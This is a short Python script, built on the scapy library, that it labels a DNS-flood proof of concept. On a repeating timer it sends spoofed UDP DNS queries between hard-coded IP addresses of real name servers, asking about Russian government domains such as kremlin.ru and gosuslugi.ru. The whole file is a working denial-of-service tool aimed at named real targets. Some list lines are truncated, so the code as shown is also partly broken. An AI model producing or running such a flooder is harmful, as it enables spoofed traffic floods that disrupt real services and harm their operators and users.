#!/usr/bin/env python3

# requires scapy
# python3 -m pip install scapy[basic]

print("======= FPP:POC-DNS-Flood =======")
print("This is a proof of concept attack that floods DNS servers, run at your own risk.")
print("Starting to send UDP packets to bad Russian name servers...")
print("")

import os
import json
import random
import threading
from scapy.all import send, IP, UDP, DNS, DNSQR


FPP_INTERVAL_MS = float(os.getenv("FPP_INTERVAL_MS", "500")) / 1000

def send_packet():
    threading.Timer(FPP_INTERVAL_MS, send_packet).start()

    ns_ips = ['77.108.76.151', '77.108.76.150', '77.108.76.84', '212.11.159.250', '185.173.0.100', '62.112.117.5', '109.207.2.218', '213.59.255.175', '91>
    src_ip = random.choice(ns_ips)
    dst_ip = random.choice(ns_ips)

    domains = ['fuckpussyputin.ru', 'customs.gov.ru', 'mos.ru', 'gosuslugi.ru', 'kremlin.ru', 'government.ru', 'mil.ru', 'nalog.gov.ru', 'pfr.gov.ru', 'r>
    dst_domain = random.choice(domains)

    print("From:", src_ip, "To:", dst_ip, "Query:", dst_domain)
    try:
        ans = send(IP(dst=dst_ip,src=src_ip)/UDP(sport=53, dport=53)/DNS(rd=1,qd=DNSQR(qname=dst_domain,qtype="TXT")))
    except Exception as e:
        print(e)

send_packet()
